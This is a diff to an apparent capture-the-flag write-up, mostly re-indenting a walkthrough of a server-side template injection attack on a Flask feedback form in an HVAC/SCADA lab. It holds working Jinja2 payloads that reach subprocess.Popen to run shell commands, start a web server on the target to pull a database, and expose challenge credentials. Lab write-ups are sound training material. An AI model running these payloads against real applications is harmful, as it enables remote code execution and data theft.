@@ -46,7 +46,7 @@ HVAC Emergency Feature: If Manual Vent button breaks, then both Trigger LEDs mus
 
     ![image 29](img/image29.png)
 
-    And the results for `10.10.10.112:80``:
+    And the results for `10.10.10.112:80`:
 
     ![image 32](img/image32.png)
 
@@ -58,33 +58,33 @@ As mentioned in the introduction, you have guest access on the network where you
 2. Performing a SQL injection attack on the Login tab won\'t work. To find the vulnerable tab, create a new account and log in.
 3. Click Register.
 
-![image 33](img/image33.png)
+    ![image 33](img/image33.png)
 
 4. Complete the fields to create a new user. This is an example.
-- username: guest
-- password: 12345678
-- first name: guest
-- email: <guest@caste.aurellia>
+    - username: guest
+    - password: 12345678
+    - first name: guest
+    - email: <guest@caste.aurellia>
 
 5. The Register button appears when the form is complete. Click the Register button.
 
-![image 37](img/image37.png)
+    ![image 37](img/image37.png)
 
-Your new user is saved in the database.
+    Your new user is saved in the database.
 
 6. Click the Login tab, and login as the new user.
 
-![image 38](img/image38.png)
+    ![image 38](img/image38.png)
 
 7. Once logged in, the new Feedback tab is visible. Select the Feedback tab.
 
-![image 39](img/image39.png)
+    ![image 39](img/image39.png)
 
 8. Complete the new form with random data and click Submit. Here is an example output. As you can see, it returned the data entered in Topic.
 
-![image 40](img/image40.png)
+    ![image 40](img/image40.png)
 
-![image 41](img/image41.png)
+    ![image 41](img/image41.png)
 
 #### IMPORTANT! Note on using Cross Site Scripting (XSS)
 
@@ -100,49 +100,50 @@ The Orange Juice Bar website uses the same template on every tab. This indicates
 
 1. Test to see if this specific tab is vulnerable to SSTI by using two common template expressions: c{{7\*7}} and 1337{{3+7}} . There are lots of template expressions you can find over the internet but, we chose these two because it provides a solved mathematical value that serves as a clear indication that this input is vulnerable to SSTI.
 
-Once you send either example, the browser returns a mathematical value. The first example returns the mathematical value of 7 \* 7, which is equal to 49. Here is an image showing results:
+    Once you send either example, the browser returns a mathematical value. The first example returns the mathematical value of 7 \* 7, which is equal to 49. Here is an image showing results:
 
-![image 44](img/image44.png)
+    ![image 44](img/image44.png)
 
-Now we know the Feedback tab is vulnerable to SSTI. Create some "proof-of-concepts".
+    Now we know the Feedback tab is vulnerable to SSTI. Create some "proof-of-concepts".
 
-Tip! Flask (Jinja2) uses Python, and in Python, everything is an object.
+    !!! tip
+        Tip! Flask (Jinja2) uses Python, and in Python, everything is an object.
 
 2. Dump the contents of the config object by entering the following: {{config.items()}}
 
-Here are the results:
+    Here are the results:
 
-![image 45](img/image45.png)
+    ![image 45](img/image45.png)
 
-That step reassures you that calling Python objects works here. Also, if a secret key was used, the secret key is shown using that command (however, there is no Secret key here).
+    That step reassures you that calling Python objects works here. Also, if a secret key was used, the secret key is shown using that command (however, there is no Secret key here).
 
 3. Let's try to exploit SSTI further. Start simple and build the payload up.
 4. Use the Python objects to navigate the inheritance tree. For this, we'll use mostly two classes:
 
-`__mro__ / mro()` (*note the two underscores with no space in between*)
-`__subclasses__` (*again, note the two underscores with no space in between*)
+    `__mro__ / mro()` (*note the two underscores with no space in between*)
+    `__subclasses__` (*again, note the two underscores with no space in between*)
 
 5. Try to access the object base class. Create a new object using a simple integer (type int). Here is an example of our payload:
 
-`{{2022.__class__.__mro__}}`
+    `{{2022.__class__.__mro__}}`
 
-And the result: 
+    And the result: 
 
-![image 46](img/image46.png)
+    ![image 46](img/image46.png)
 
 6. Now, we want access to the root object class. Select the item at index 1 and use `__subclasses__()` to list the classes available in the application. For example: `{{2022.__class__.__mro__[1].__subclasses__()}}`
 
-And the result:
+    And the result:
 
-![image 47](img/image47.png)
+    ![image 47](img/image47.png)
 
-Now you have a full list of all the classes available within the application. All apps are different, so they will be exploited differently. Like we previously mentioned, we developed this challenge so many different methods for exploitation could be employed; however, the focus of this challenge is on executing remote commands.
+    Now you have a full list of all the classes available within the application. All apps are different, so they will be exploited differently. Like we previously mentioned, we developed this challenge so many different methods for exploitation could be employed; however, the focus of this challenge is on executing remote commands.
 
 7. We'll perform remote code execution (RCE) now. Find the following class: subprocess.Popen. You can do this by pressing ctrl+F in the browser and searching for subprocess.Popen. Note the index/position where it is found. You can count the classes one by one until you reach subprocess.Popen, but this will take a long time. So, even though we are solving this challenge using the web interface, we will create a script to find the index more easily.
 
 Here is our script:
 
-```
+    ```
 #!/bin/bash
 
 ### STEP 1: Once you see all available classes in the application, copy and paste the website link and use it to make a curl like: 
@@ -171,88 +172,86 @@ echo "Only adding lines that include 'class &#39;' to a file. $step_3" > /dev/nu
     
 echo -e "Showing which line contains 'subprocess.Popen'. \nThe result is line: $step_4" 
 ```
-The result equals 312. Let's build our latest payload using that index:
+    The result equals 312. Let's build our latest payload using that index:
 
-```
+    ```
 {{2022.__class__.__mro__[1].__subclasses__()[312]}}
 ```
 
-And here is the result:
+    And here is the result:
 
-![image 48](img/image48.png)
+    ![image 48](img/image48.png)
 
-Index 312 is indeed  subprocess.Popen.
+    Index 312 is indeed subprocess.Popen.
 
-Do not skip this step because your index might be different.
+    Do not skip this step because your index might be different.
 
 8. Now, that we have the right index, subprocess.Popen allows us to  execute commands. The following payload is an example:
 
-```
-{{2022.__class__.__mro__[1].__subclasses__()[312]('whoami', shell=True, stdout=-1).communicate()}}
-```
+    ```
+    {{2022.__class__.__mro__[1].__subclasses__()[312]('whoami', shell=True, stdout=-1).communicate()}}
+    ```
 
-![image 49](img/image49.png)
+    ![image 49](img/image49.png)
 
-You managed to execute remote commands!
+    You managed to execute remote commands!
 
 9. Now that remote commands are possible, see which directory we are in. Go to the payload and changing whoami to pwd.
 
-```
-{{2022.__class__.__mro__[1].__subclasses__()[312]('pwd', shell=True, stdout=-1).communicate()}}
-```
+    ```
+    {{2022.__class__.__mro__[1].__subclasses__()[312]('pwd', shell=True, stdout=-1).communicate()}}
+    ```
 
-![image 50](img/image50.png)
+    ![image 50](img/image50.png)
 
-We're in the `/var/www/html/orangejuice/` directory.
+    We're in the `/var/www/html/orangejuice/` directory.
 
 10. See what else is in this directory. You can do this by changing pwd to ls.
 
-```
-{{2022.__class__.__mro__[1].__subclasses__()[312]('ls', shell=True, stdout=-1).communicate()}}
-```
+    ```
+    {{2022.__class__.__mro__[1].__subclasses__()[312]('ls', shell=True, stdout=-1).communicate()}}
+    ```
 
-![image 51](img/image51.png)
-
+    ![image 51](img/image51.png)
 
 11. We are trying to find a way to get the credentials for the RapidSCADA website, so the oranges.db file may be helpful. Let's get that file. Use python to create a simple web server to host the files in that directory including the oranges.db file. Here's what we used as a payload.
 
-Avoid using any of the ports that were already taken by this IP address.
+    Avoid using any of the ports that were already taken by this IP address.
 
-```
-{{2022.__class__.__mro__[1].__subclasses__()[312]('python3 -m http.server 2022', shell=True, stdout=-1).communicate()}}
-```
+    ```
+    {{2022.__class__.__mro__[1].__subclasses__()[312]('python3 -m http.server 2022', shell=True, stdout=-1).communicate()}}
+    ```
 
 12. Upon clicking Submit, the Orange Juice Bar website "hangs." This  means our command is running in the background. Open a new tab and type the following to access the wanted    files: `http://10.10.10.110:2022](http://10.10.10.110:2022`
 
-If you used a different port, make sure to use that one instead.
+    If you used a different port, make sure to use that one instead.
 
-![image 52](img/image52.png)
+    ![image 52](img/image52.png)
 
 13. Here are our files! Download oranges.db and look at the contents of that file. Right-click the oranges.db and open with SQLite database browser.
 
-![image 53](img/image53.png)
+    ![image 53](img/image53.png)
 
-Here is what you'll see.
+    Here is what you'll see.
 
-![image 54](img/image54.png)
+    ![image 54](img/image54.png)
 
 14. We want to find the users. Right-click users, then Browse Table.
 
-![image 55](img/image55.png)
+    ![image 55](img/image55.png)
 
-Passwords are in plaintext!
+    Passwords are in plaintext!
 
-![image 56](img/image56.png)
+    ![image 56](img/image56.png)
 
 15. We want the user who oversees RapidSCADA since the purpose of the challenge is to fix the HVAC system. Search for keywords to see if this helps. Search for HVAC first.
 
-![image 57](img/image57.png)
+    ![image 57](img/image57.png)
 
 16. This user seems like a good candidate. Write the credentials down.
 
-user: maalroia-5fec0e
-password: the_HVAC_master_21!!
-
+    user: maalroia-5fec0e
+    password: the_HVAC_master_21!!
 
 ## Fixing HVAC Sector 6 venting
 
